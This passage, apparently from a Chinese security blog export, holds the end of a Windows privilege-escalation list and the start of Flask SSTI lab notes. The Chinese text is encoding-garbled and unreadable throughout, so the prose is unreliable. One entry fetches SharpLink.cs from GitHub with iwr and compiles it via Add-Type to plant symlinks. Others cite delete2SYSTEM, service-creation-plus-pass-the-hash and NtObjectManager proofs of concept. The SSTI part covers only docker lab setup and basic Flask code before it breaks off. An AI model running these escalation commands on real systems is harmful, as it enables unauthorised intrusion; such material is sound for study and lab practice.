<h3 id="Ghost-Pepper"><a href="#Ghost-Pepper" class="headerlink" title="Ghost Pepper"></a>Ghost Pepper</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  <strong>allow low privileged user accounts to create file system and registry symbolic links</strong></p>
<p>æ–¹æ³•ï¼š </p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> <span class="token variable">$code</span> = <span class="token punctuation">(</span><span class="token function">iwr</span> https:<span class="token operator">/</span><span class="token operator">/</span>raw<span class="token punctuation">.</span>githubusercontent<span class="token punctuation">.</span>com/usdAG/SharpLink/main/SharpLink<span class="token punctuation">.</span>cs<span class="token punctuation">)</span><span class="token punctuation">.</span>content
<span class="token function">PS</span> C:\> <span class="token function">Add-Type</span> <span class="token variable">$code</span>                                                                                          
<span class="token function">PS</span> C:\> <span class="token variable">$s</span> = <span class="token function">New-Object</span> de<span class="token punctuation">.</span>usd<span class="token punctuation">.</span>SharpLink<span class="token punctuation">.</span>Symlink<span class="token punctuation">(</span>â€œC:\Users\Public\Example\linkâ€<span class="token punctuation">,</span> â€œC:\ProgramData\target<span class="token punctuation">.</span>txtâ€<span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Open<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">PS</span> C:\> <span class="token function">echo</span> â€œHello World :Dâ€ > C:\Users\Public\Example\link
<span class="token function">PS</span> C:\> <span class="token function">type</span> C:\ProgramData\target<span class="token punctuation">.</span>txt
Hello World ğŸ˜€
<span class="token function">PS</span> C:\> <span class="token variable">$s</span><span class="token punctuation">.</span>Close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="Chocolate-Scorpion-Chilli"><a href="#Chocolate-Scorpion-Chilli" class="headerlink" title="Chocolate Scorpion Chilli"></a>Chocolate Scorpion Chilli</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Directory-Deletion + Windows Media Player d&#x2F;s</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/sailay1996/delete2SYSTEM</code></li>
<li><code>.\poc.ps1</code></li>
</ul>
<h3 id="Carolina-Reaper"><a href="#Carolina-Reaper" class="headerlink" title="Carolina Reaper"></a>Carolina Reaper</h3><p>åŸŸï¼šYes</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  Creates an arbitrary service + PTH</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/tyranid/blackhat-usa-2022-demos</code></li>
<li><code>Demo6.ps1</code></li>
</ul>
<h3 id="The-Intimidator-Chilli"><a href="#The-Intimidator-Chilli" class="headerlink" title="The Intimidator Chilli"></a>The Intimidator Chilli</h3><p>åŸŸï¼šNo</p>
<p>Local Admin: Yes</p>
<p>æ“ä½œç³»ç»Ÿï¼š Windows</p>
<p>ç±»å‹ï¼š  manipulate memory&#x2F;process token values&#x2F;NT system calls and objects&#x2F;NT object manager</p>
<p>æ–¹æ³•ï¼š </p>
<ul>
<li><code>https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools</code></li>
<li><code>Import-Module NtObjectManager</code></li>
<li><code>Get-ChildItem NtObject:\</code></li>
<li><code>NT*</code></li>
</ul>
<h3 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h3><p>æ‘˜é€‰è‡ª[117ç§ææƒæ–¹æ³•](<a href="https://mp.weixin.qq.com/mp/wappoc_appmsgcaptcha?poc_token=HO1gV2WjX-cxpRTeHgkYW7opx01zPy6NqCBn2xA7&target_url=https://mp.weixin.qq.com/s/mqJ6rcFeKtCze0F5GN257Q">å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com)</a>)</p>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SSTIæ¼æ´æ€»ç»“å­¦ä¹ </title>
    <url>/2023/11/15/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è§‚çœ‹Bç«™æ•™å­¦è§†é¢‘<a href="https://www.bilibili.com/video/BV1tj411u7Bx/?spm_id_from=333.999.0.0">é‡åº†æ©™å­ç§‘æŠ€</a> çš„ç¬”è®°ï¼Œä¸ªäººè®¤ä¸ºè´¨é‡å¾ˆå¥½ï¼Œè®°å½•ä¸€ä¸‹ã€‚</p>
<h2 id="é¶åœºéƒ¨ç½²"><a href="#é¶åœºéƒ¨ç½²" class="headerlink" title="é¶åœºéƒ¨ç½²"></a>é¶åœºéƒ¨ç½²</h2><h3 id="dockeråœ°å€"><a href="#dockeråœ°å€" class="headerlink" title="dockeråœ°å€"></a>dockeråœ°å€</h3><p>mcc0624&#x2F;flask_ssti:last</p>
<h3 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h3><p>å‰ææ˜¯ä½ æœåŠ¡å™¨å·²ç»å®‰è£…äº†dockerï¼Œè¿˜æœ‰æä¸€ç‚¹ï¼Œæ³¨æ„äº‘æœåŠ¡å™¨å®‰å…¨ç»„çš„é…ç½®<br>æ‹‰å–é•œåƒ</p>
<blockquote>
<p>docker pull mcc0624&#x2F;flask_ssti:last</p>
</blockquote>
<p><strong>æŸ¥çœ‹é•œåƒ</strong><br><img src="https://img-blog.csdnimg.cn/7c2275fe3e05482bbfcb703c1fd5cd66.png" alt="123"><br>æ­¤æ—¶å·²ç»æ‹‰å–åˆ°æœ¬åœ°</p>
<blockquote>
<p>æŒ‡å®šç«¯å£è¿è¡Œå®¹å™¨å¹¶ä¸”è¿›å…¥å‘½ä»¤è¡Œ<br><code>docker run -p 18022:80 -i -t mcc0624/flask_ssti:last bash -c &#39;/etc/rc.local; /bin/sh&#39;</code></p>
</blockquote>
<p>å¼€å¯&#x2F;å…³é—­å®¹å™¨</p>
<blockquote>
<p>å¼€å¯<br>docker run -p 8888:80 -t mcc0624&#x2F;flask_ssti:last<br>å…³é—­<br>docker stop imageid</p>
</blockquote>
<h2 id="Python-venv"><a href="#Python-venv" class="headerlink" title="Python venv"></a>Python venv</h2><p>å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€ä¸ªå®¹å™¨ï¼Œè¯¥å®¹å™¨ä¾›ä½ ç”¨æ¥å­˜æ”¾ä½ çš„Pythonè„šæœ¬ä»¥åŠå®‰è£…å„ç§Pythonç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå®¹å™¨é‡Œçš„ç¯å¢ƒå’Œæœ¬æœºæ˜¯å®Œå…¨åˆ†å¼€çš„(å°±åƒä½ åœ¨Windowsä¸»æœºä¸Šé€šè¿‡Vmwareè·‘ä¸€å°Ubuntuæˆ–è€…CentOSçš„è™šæ‹Ÿä¸»æœºä¸€æ ·)ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ åœ¨venvä¸‹é€šè¿‡pipå®‰è£…çš„Pythonç¬¬ä¸‰æ–¹æ¨¡å—æ˜¯ä¸ä¼šå­˜åœ¨äºä½ æœ¬æœºçš„ç¯å¢ƒä¸‹çš„ã€‚</p>
<h3 id="å®‰è£…venv"><a href="#å®‰è£…venv" class="headerlink" title="å®‰è£…venv"></a>å®‰è£…venv</h3><blockquote>
<p>apt install python3-venv</p>
</blockquote>
<p>åˆ›å»ºvenvç¯å¢ƒå®‰è£…flask<br>è¿›å…¥&#x2F;optç›®å½•ï¼Œè¿è¡Œå‘½ä»¤ï¼š</p>
<blockquote>
<p>python3 -m venv flask1<br>cd fl*<br>l<br>è¿™é‡ŒåŒ…å«pythonè™šæ‹Ÿç¯å¢ƒçš„ç»„ä»¶<br><img src="https://img-blog.csdnimg.cn/f544a20f541b42eea056ad0d2589e719.png" alt="1"></p>
</blockquote>
<p>æ­¤æ—¶å’±ä»¬åœ¨&#x2F;optç›®å½•åˆ›å»ºä¸€ä¸ªæ–‡ä»¶demo.py<br>ç„¶åæ‰§è¡Œæ–‡ä»¶</p>
<blockquote>
<p>python3 demo.py<br><img src="https://img-blog.csdnimg.cn/7a1cb258217d4db0b691dae1a8d34312.png" alt="123"></p>
</blockquote>
<p>è¯·æ³¨æ„ï¼Œè¿™é‡Œä½¿ç”¨çš„ç‰©ç†ä¸»æœºçš„pythonç¯å¢ƒæ‰§è¡Œçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä½¿ç”¨è™šæ‹Ÿçš„pythonç¯å¢ƒæ¥æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ</p>
<blockquote>
<p>æ‰§è¡Œflask1è·¯å¾„ä¸‹çš„python<br><img src="https://img-blog.csdnimg.cn/36ecf712be56493d8eef85062c3b2bd8.png" alt="123"></p>
</blockquote>
<p>è¿™æ—¶å°±æ˜¯ç”¨è™šæ‹Ÿçš„pythonç¯å¢ƒæ‰§è¡Œè¯¥æ–‡ä»¶<br>å½“ç„¶è¿˜å¯ä»¥è¿™æ ·</p>
<blockquote>
<p>cd flask1<br>è¿›å…¥è™šæ‹Ÿç¯å¢ƒ<br>source .&#x2F;bin&#x2F;activate<br>é€€å‡ºè™šæ‹Ÿç¯å¢ƒ<br>dactivate</p>
</blockquote>
<h2 id="è™šæ‹Ÿç¯å¢ƒä¸‹å®‰è£…flaskä»¥åŠåº”ç”¨"><a href="#è™šæ‹Ÿç¯å¢ƒä¸‹å®‰è£…flaskä»¥åŠåº”ç”¨" class="headerlink" title="è™šæ‹Ÿç¯å¢ƒä¸‹å®‰è£…flaskä»¥åŠåº”ç”¨"></a>è™šæ‹Ÿç¯å¢ƒä¸‹å®‰è£…flaskä»¥åŠåº”ç”¨</h2><p><strong>å®‰è£…</strong></p>
<blockquote>
<p>pip install flask</p>
</blockquote>
<p><strong>åº”ç”¨</strong></p>
<blockquote>
<p>vim demo.py</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™ä¸ªæ—¶å€™é»˜è®¤ç«¯å£ä¸º5000<br>å¦‚æœä½ æƒ³è¦æ”¹å˜ç«¯å£é‚£å°±ä¿®æ”¹æ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flsak <span class="token keyword">import</span> Flask
app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"hello benben"</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¦‚æœæƒ³è¦å¼€å¯debugæ¨¡å¼ï¼Œåªéœ€åŠ ä¸Š<code>debug=True</code></p>
<h3 id="Flaskå˜é‡è§„åˆ™"><a href="#Flaskå˜é‡è§„åˆ™" class="headerlink" title="Flaskå˜é‡è§„åˆ™"></a>Flaskå˜é‡è§„åˆ™</h3><p>é€šè¿‡å‘è§„åˆ™å‚æ•°æ·»åŠ å˜é‡éƒ¨åˆ†ï¼Œå¯ä»¥åŠ¨æ€æ„å»ºURLã€‚æ­¤å˜é‡éƒ¨åˆ†æ ‡è®°ä¸º<variable-name>ã€‚å®ƒä½œä¸ºå…³é”®å­—å‚æ•°ä¼ é€’ç»™ä¸è§„åˆ™ç›¸å…³è”çš„å‡½æ•°ã€‚</p>
<p>åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼Œroute()è£…é¥°å™¨çš„è§„åˆ™å‚æ•°åŒ…å«é™„åŠ åˆ°URL â€˜&#x2F;helloâ€™çš„<name>ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨æµè§ˆå™¨ä¸­è¾“å…¥<a href="http://localhost:5000/hello/w3cschool%E4%BD%9C%E4%B8%BAURL%EF%BC%8C%E5%88%99&#39;w3cschool&#39;%E5%B0%86%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E6%8F%90%E4%BE%9B%E7%BB%99hello()%E5%87%BD%E6%95%B0%E3%80%82">http://localhost:5000/hello/w3cschoolä½œä¸ºURLï¼Œåˆ™&#39;w3cschool&#39;å°†ä½œä¸ºå‚æ•°æä¾›ç»™hello()å‡½æ•°ã€‚</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Hello %s!'</span> <span class="token operator">%</span> name
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/b34afe36bbf44367b590efa57654ec49.png" alt="123"><br>é™¤äº†é»˜è®¤å­—ç¬¦ä¸²å˜é‡éƒ¨åˆ†ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è½¬æ¢å™¨æ„å»ºè§„åˆ™ï¼š<br><img src="https://img-blog.csdnimg.cn/33c6bdc86942423798ca61af1cc428a2.png" alt="1"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blog/&lt;int:postID>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show_blog</span><span class="token punctuation">(</span>postID<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Blog Number %d'</span> <span class="token operator">%</span> postID
 
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/rev/&lt;float:revNo>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">revision</span><span class="token punctuation">(</span>revNo<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'Revision Number %f'</span> <span class="token operator">%</span> revNo
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Flask-HTTPæ–¹æ³•"><a href="#Flask-HTTPæ–¹æ³•" class="headerlink" title="Flask HTTPæ–¹æ³•"></a>Flask HTTPæ–¹æ³•</h3><p><img src="https://img-blog.csdnimg.cn/e76311f64df0491b84805ff582c04d5a.png" alt="123"></p>
<h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>GETæ–¹æ³•ç”¨äºä»æœåŠ¡å™¨è·å–æ•°æ®ã€‚å®ƒæ²¡æœ‰è¯·æ±‚ä½“ï¼Œæ‰€æœ‰å‚æ•°éƒ½åŒ…å«åœ¨URLä¸­ã€‚åœ¨Flaskä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨routeè£…é¥°å™¨æ¥å®šä¹‰GETè·¯ç”±ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹ä»£ç æ¼”ç¤ºå¦‚ä½•å®šä¹‰ä¸€ä¸ªç®€å•çš„GETè·¯ç”±ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;username>'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">get_user</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello,%s!'</span><span class="token operator">%</span> username

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/5e9f57615db7473e9484adf03b5943a3.png" alt="123"></p>
<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>POSTæ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨æäº¤æ•°æ®ã€‚åœ¨Flaskä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡routeè£…é¥°å™¨å°†POSTè·¯ç”±å…³è”åˆ°è§†å›¾å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„POSTè·¯ç”±çš„ç¤ºä¾‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_data<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    name<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    email<span class="token operator">=</span>json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>

    <span class="token keyword">return</span> <span class="token string">'User created successfully'</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/4c4bda8917ad457b8be45f8e97bb41e4.png" alt="123"></p>
<h3 id="PUT"><a href="#PUT" class="headerlink" title="PUT"></a>PUT</h3><p>PUTæ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨æ›´æ–°æ•°æ®ã€‚åœ¨Flaskä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡routeè£…é¥°å™¨å°†PUTè·¯ç”±å…³è”åˆ°è§†å›¾å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„PUTè·¯ç”±ç¤ºä¾‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;id>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">update_user</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    json_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    name <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    email <span class="token operator">=</span> json_data<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>
    <span class="token comment"># ... code to update user ...</span>
    <span class="token keyword">return</span> <span class="token string">'User updated successfully'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/bc07498f2db246ac8a70637a9a6cb6b2.png" alt="456"></p>
<h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>DELETEæ–¹æ³•ç”¨äºä»æœåŠ¡å™¨åˆ é™¤æ•°æ®ã€‚åœ¨Flaskä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡routeè£…é¥°å™¨å°†DELETEè·¯ç”±å…³è”åˆ°è§†å›¾å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„DELETEè·¯ç”±ç¤ºä¾‹ï¼š</p>
<pre class="line-numbers language-pyhon" data-language="pyhon"><code class="language-pyhon">from flask import Flask

app &#x3D; Flask(__name__)

@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;, methods&#x3D;[&#39;DELETE&#39;])
def delete_user(id):
    # ... code to delete user ...
    return &#39;User deleted successfully&#39;

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
    app.run(debug&#x3D;True,host&#x3D;&#39;0.0.0.0&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/97c43ec5172743e5b3b20c1f0095ccb8.png" alt="789"></p>
<h2 id="Flaskæ¨¡æ¿ä»‹ç»"><a href="#Flaskæ¨¡æ¿ä»‹ç»" class="headerlink" title="Flaskæ¨¡æ¿ä»‹ç»"></a>Flaskæ¨¡æ¿ä»‹ç»</h2><p>ä»‹ç»ï¼š<a href="https://blog.csdn.net/weixin_42577686/article/details/124524571">Flaskæ¨¡æ¿çš„ä»‹ç»ä¸ä½¿ç”¨</a><br><img src="https://img-blog.csdnimg.cn/2bb1224d9c574e6abbfbfa4cf27108f1.png" alt="46"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#app.py</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span>request

app<span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    my_str<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ben'</span><span class="token punctuation">)</span>
    my_int<span class="token operator">=</span><span class="token number">123</span>
    my_array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span>
    my_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'daming'</span><span class="token punctuation">,</span>
        <span class="token string">'age'</span><span class="token punctuation">:</span><span class="token number">18</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span>my_str<span class="token operator">=</span>my_str<span class="token punctuation">,</span>my_int<span class="token operator">=</span>my_int<span class="token punctuation">,</span>my_array<span class="token operator">=</span>my_array<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">#åˆ›å»ºä¸€ä¸ªç›®å½•templatesï¼Œç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶index.html
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
æ¨¡æ¿htmlå±•ç¤ºé¡µé¢
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
